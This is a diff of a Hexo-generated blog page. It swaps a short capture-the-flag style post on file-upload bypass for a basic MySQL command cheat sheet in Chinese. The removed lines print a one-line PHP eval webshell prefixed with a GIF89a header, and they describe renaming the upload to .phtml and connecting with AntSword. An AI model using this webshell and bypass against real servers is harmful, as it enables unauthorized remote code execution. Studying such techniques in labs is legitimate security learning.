@@ -207,20 +207,20 @@
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="12GIF89a&lt;script language&#x3D;&quot;php&quot;&gt;eval($_GET[shell])&lt;&#x2F;script&gt; 通常，在嵌入了php脚本的html中，使用 phtml作为后缀名；完全是php写的，则使用php作为后缀名。这两种文件，web服务器都会用php解释器进行解析。 当不能使用php代码直接注入时可以改为phtml格式加入GIF89a(图片头">
+  <meta name="description" content="数据库操作： 链接数据库 cd 进入bin目录 输入 mysql -u root -p 然后输入密码操作 show databases; 显示数据库 use 库名; 选择数据库 DROP DATABASE 库名; 删除库 creat database 库名; 创建库表操作：    show tables; 显示表 drop table 表名; 删除表 creat table 表名(列名 类型 是否">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/2021/09/26/GIF89a/index.html">
+<meta property="og:url" content="http://example.com/2021/10/02/mysql%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="12GIF89a&lt;script language&#x3D;&quot;php&quot;&gt;eval($_GET[shell])&lt;&#x2F;script&gt; 通常，在嵌入了php脚本的html中，使用 phtml作为后缀名；完全是php写的，则使用php作为后缀名。这两种文件，web服务器都会用php解释器进行解析。 当不能使用php代码直接注入时可以改为phtml格式加入GIF89a(图片头">
+<meta property="og:description" content="数据库操作： 链接数据库 cd 进入bin目录 输入 mysql -u root -p 然后输入密码操作 show databases; 显示数据库 use 库名; 选择数据库 DROP DATABASE 库名; 删除库 creat database 库名; 创建库表操作：    show tables; 显示表 drop table 表名; 删除表 creat table 表名(列名 类型 是否">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/97cb183433d94d4b9f8dd45ee661b862.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/d84d1c9b84874534a08d06b09535dcdb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA55-z5pif7oCx,size_20,color_FFFFFF,t_70,g_se,x_16">
-<meta property="article:published_time" content="2021-09-26T02:16:47.927Z">
-<meta property="article:modified_time" content="2021-09-26T02:17:40.709Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/07ef5823c84f49279abd8ab0f5a12656.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/0d60f2fa512b4938be65506c52bd9a9d.png">
+<meta property="article:published_time" content="2021-10-02T03:10:22.675Z">
+<meta property="article:modified_time" content="2021-09-26T02:01:07.232Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/97cb183433d94d4b9f8dd45ee661b862.png">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/07ef5823c84f49279abd8ab0f5a12656.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -431,7 +431,7 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-GIF89a" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-mysql记录" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
   <div class="article-entry" itemprop="articleBody">
@@ -442,12 +442,67 @@
     
 
     
-    <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_GET</span>[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>通常，在嵌入了php脚本的html中，使用 phtml作为后缀名；完全是php写的，则使用php作为后缀名。这两种文件，web服务器都会用php解释器进行解析。</p>
-<p>当不能使用php代码直接注入时可以改为phtml格式加入GIF89a(图片头文件欺骗)，后台认为是图片,上传后再执行木马。</p>
-<p>先将文件改为.gif欺骗网址第一层，抓包将filename改为以.phtml结尾并以这种方式进行，GIF89a则负责骗过第二层。</p>
-<p><img src="https://img-blog.csdnimg.cn/97cb183433d94d4b9f8dd45ee661b862.png" alt="请添加图片描述"></p>
-<p>通过蚁剑一般连接的是：url/upload/文件名<br>此题为：<img src="https://img-blog.csdnimg.cn/d84d1c9b84874534a08d06b09535dcdb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA55-z5pif7oCx,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>蚁剑连接即可</p>
+    <h1 id="数据库操作："><a href="#数据库操作：" class="headerlink" title="数据库操作："></a>数据库操作：</h1><hr>
+<h2 id="链接数据库"><a href="#链接数据库" class="headerlink" title="链接数据库"></a>链接数据库</h2><ul>
+<li>cd 进入bin目录 输入 mysql -u root -p 然后输入密码<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2></li>
+<li>show databases; 显示数据库</li>
+<li>use 库名; 选择数据库</li>
+<li>DROP DATABASE 库名; 删除库</li>
+<li>creat database 库名; 创建库<h1 id="表操作："><a href="#表操作：" class="headerlink" title="表操作："></a>表操作：</h1></li>
+</ul>
+<hr>
+<ul>
+<li>show tables; 显示表</li>
+<li>drop table 表名; 删除表</li>
+<li>creat table 表名(<br>列名 类型 是否可以为空，<br>列名 类型 是否可以为空，<br>)ENGINE=InnoDB DEFAULT CHARSET=utf8;<br><img src="https://img-blog.csdnimg.cn/07ef5823c84f49279abd8ab0f5a12656.png" alt="请添加图片描述"></li>
+</ul>
+<h1 id="字段操作："><a href="#字段操作：" class="headerlink" title="字段操作："></a>字段操作：</h1><hr>
+<ul>
+<li><p>alter table 表名<br>  add column `字段名` &lt;数据类型&gt; comment `备注`; 添加字段<br>  <img src="https://img-blog.csdnimg.cn/0d60f2fa512b4938be65506c52bd9a9d.png" alt="请添加图片描述"></p>
+</li>
+<li><p>alter table 表名<br>change column `老字段名` `新字段名` &lt;数据类型&gt; comment `备注`; 修改字段</p>
+</li>
+<li><p>alter table 表名</p>
+</li>
+<li><p>drop column 表名; 删除字段</p>
+</li>
+</ul>
+<h1 id="记录操作："><a href="#记录操作：" class="headerlink" title="记录操作："></a>记录操作：</h1><hr>
+<h2 id="增："><a href="#增：" class="headerlink" title="增："></a>增：</h2><h3 id="一次插入一条"><a href="#一次插入一条" class="headerlink" title="一次插入一条"></a>一次插入一条</h3><ul>
+<li>insert into `表名`  set  `字段名1` = ‘value1’ ,`字段名2` = ‘value2’<h3 id="一次插入多条"><a href="#一次插入多条" class="headerlink" title="一次插入多条"></a>一次插入多条</h3></li>
+<li>insert into `表名`  ( `字段名1`, `字段名2`) values ( value1.1,value1.2 ),(value2.1,value2.2 ) <h3 id="根据索引值进行判断，若存在，先删除在插入"><a href="#根据索引值进行判断，若存在，先删除在插入" class="headerlink" title="根据索引值进行判断，若存在，先删除在插入"></a>根据索引值进行判断，若存在，先删除在插入</h3></li>
+<li>replace into `表名`  set  `字段名1` = ‘value1’ ,`字段名2` = ‘value2’<h2 id="删："><a href="#删：" class="headerlink" title="删："></a>删：</h2><h3 id="删除一条或多条"><a href="#删除一条或多条" class="headerlink" title="删除一条或多条"></a>删除一条或多条</h3></li>
+<li>delete from 表名 where id = （=也可以换成&gt;,&lt;）<br>(id号还是会继续累加)<h3 id="初始化表"><a href="#初始化表" class="headerlink" title="初始化表"></a>初始化表</h3></li>
+<li>truncate 表名<br>(id号从1开始)<h2 id="改"><a href="#改" class="headerlink" title="改:"></a>改:</h2></li>
+<li>update 表名 set  字段名1 = ‘value1’ ,字段名2 = ‘value2’ where id =<h2 id="查："><a href="#查：" class="headerlink" title="查："></a>查：</h2><h3 id="单表查询"><a href="#单表查询" class="headerlink" title="单表查询"></a>单表查询</h3><h4 id="查询表中某些字段"><a href="#查询表中某些字段" class="headerlink" title="查询表中某些字段"></a>查询表中某些字段</h4></li>
+<li>select 字段1,字段2 from 表 <h4 id="以表中某些字段为条件查询"><a href="#以表中某些字段为条件查询" class="headerlink" title="以表中某些字段为条件查询"></a>以表中某些字段为条件查询</h4></li>
+<li>select * from 表 where 字段1=’value1’ and 字段2=’value2’<br>若查看除某些字段以外的其他：</li>
+<li>select * from 表 where 字段 not in (‘value1’,’value2’)</li>
+<li>select * from 表 where 字段 &lt;&gt; ‘value’<h4 id="按照id号查询"><a href="#按照id号查询" class="headerlink" title="按照id号查询"></a>按照id号查询</h4></li>
+</ul>
+<p>1.select * from 表 where id =1or id=2 or id=3<br>2.select * from 表 where id in(1,2,3)<br>3.select * from 表 where id in(‘1’,’2’,’3’)<br>若查看除某些id号以外的其他：</p>
+<ul>
+<li>select * from 表 where id not in(‘1’,’2’,’3’)</li>
+</ul>
+<h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><ul>
+<li><p>select * from 表  order by 字段 desc(降) asc(胜) limit 0,3<br>(limit 0,3 从第一个开始选 选三个)</p>
+<h3 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h3><h4 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h4><blockquote>
+<p>场景：有两个表 员工信息employee_info ，员工工资employ_pay<br>我们需要根据一个人的姓名对应的id，查询对应的工资以及显示对应的姓名</p>
+</blockquote>
+</li>
+<li><p>select pay,(select name from employ_info where id=3) as username from employ_pay where nameid=3</p>
+<h4 id="关联查询"><a href="#关联查询" class="headerlink" title="关联查询"></a>关联查询</h4></li>
+<li><p>select b.name,a.pay from employ_pay a,employee_info b where a.nameid=b.id and b.id=3</p>
+<h4 id="左-右链接查询"><a href="#左-右链接查询" class="headerlink" title="左/右链接查询"></a>左/右链接查询</h4></li>
+<li><p>左链接查询<br>(显示左边表所有记录，以及右边表满足条件的记录)<br>select a.*,b.pay from employee_info a left join employee_pay b on a.id=b.nameid</p>
+</li>
+<li><p>右链接查询<br>(显示右边表所有记录，以及左边表满足条件的记录)<br>select a.*,b.pay from employee_pay a left join employee_info b on a.id=b.nameid</p>
+<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3></li>
+<li><p>查询语句1<br>union<br>查询语句2</p>
+</li>
+<li><p>条件：<br>1、要求多条查询 语句的查询列数是一致的<br>2、要求多条查询语句的查询的每一列的类型和最好一致<br>3、union关键字默认去重，如果使用union all 可以包含重复项</p>
+</li>
+</ul>
 
     
     
@@ -493,7 +548,7 @@
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="http://example.com/2021/09/26/GIF89a/" title="" target="_blank">http://example.com/2021/09/26/GIF89a/</a>
+          <a href="http://example.com/2021/10/02/mysql记录/" title="" target="_blank">http://example.com/2021/10/02/mysql记录/</a>
         </li>
         
         <li>
@@ -560,7 +615,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/09/26/GIF89a/" alt="微信分享二维码"> -->
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/10/02/mysql%E8%AE%B0%E5%BD%95/" alt="微信分享二维码"> -->
     </div>
 </div>
 
@@ -575,7 +630,7 @@
 
 <nav id="article-nav">
   
-    <a href="/2021/09/26/sqllab/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2021/10/02/sqllab/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
@@ -585,7 +640,7 @@
     </a>
   
   
-    <a href="/2021/09/26/mysql%E8%AE%B0%E5%BD%95/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2021/10/02/GIF89a/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title"></div>
       <i class="icon-circle-right"></i>
     </a>
@@ -613,7 +668,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    目录，不存在的…
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">数据库操作：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%93%BE%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.1.</span> <span class="toc-text">链接数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C"><span class="toc-number">1.2.</span> <span class="toc-text">操作</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A1%A8%E6%93%8D%E4%BD%9C%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">表操作：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%97%E6%AE%B5%E6%93%8D%E4%BD%9C%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">字段操作：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%B0%E5%BD%95%E6%93%8D%E4%BD%9C%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">记录操作：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A2%9E%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">增：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E6%AC%A1%E6%8F%92%E5%85%A5%E4%B8%80%E6%9D%A1"><span class="toc-number">4.1.1.</span> <span class="toc-text">一次插入一条</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E6%AC%A1%E6%8F%92%E5%85%A5%E5%A4%9A%E6%9D%A1"><span class="toc-number">4.1.2.</span> <span class="toc-text">一次插入多条</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E7%B4%A2%E5%BC%95%E5%80%BC%E8%BF%9B%E8%A1%8C%E5%88%A4%E6%96%AD%EF%BC%8C%E8%8B%A5%E5%AD%98%E5%9C%A8%EF%BC%8C%E5%85%88%E5%88%A0%E9%99%A4%E5%9C%A8%E6%8F%92%E5%85%A5"><span class="toc-number">4.1.3.</span> <span class="toc-text">根据索引值进行判断，若存在，先删除在插入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A0%EF%BC%9A"><span class="toc-number">4.2.</span> <span class="toc-text">删：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E4%B8%80%E6%9D%A1%E6%88%96%E5%A4%9A%E6%9D%A1"><span class="toc-number">4.2.1.</span> <span class="toc-text">删除一条或多条</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E8%A1%A8"><span class="toc-number">4.2.2.</span> <span class="toc-text">初始化表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B9"><span class="toc-number">4.3.</span> <span class="toc-text">改:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%EF%BC%9A"><span class="toc-number">4.4.</span> <span class="toc-text">查：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E8%A1%A8%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.4.1.</span> <span class="toc-text">单表查询</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%A1%A8%E4%B8%AD%E6%9F%90%E4%BA%9B%E5%AD%97%E6%AE%B5"><span class="toc-number">4.4.1.1.</span> <span class="toc-text">查询表中某些字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A5%E8%A1%A8%E4%B8%AD%E6%9F%90%E4%BA%9B%E5%AD%97%E6%AE%B5%E4%B8%BA%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.4.1.2.</span> <span class="toc-text">以表中某些字段为条件查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%89%E7%85%A7id%E5%8F%B7%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.4.1.3.</span> <span class="toc-text">按照id号查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%92%E5%BA%8F"><span class="toc-number">4.4.1.4.</span> <span class="toc-text">排序</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E8%A1%A8%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.4.2.</span> <span class="toc-text">多表查询</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%90%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.4.2.1.</span> <span class="toc-text">子查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E8%81%94%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.4.2.2.</span> <span class="toc-text">关联查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A6-%E5%8F%B3%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.4.2.3.</span> <span class="toc-text">左&#x2F;右链接查询</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.4.3.</span> <span class="toc-text">联合查询</span></a></li></ol></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -639,7 +694,7 @@
   <script>
   <!-- id: "" -->
   var giteement = new Giteement({
-    id: '20210926101647',
+    id: '20211002111022',
     owner: 'nate-lin',
     repo: 'nate-lin-demo',
     backcall_uri: 'https://nate-lin.gitee.io',
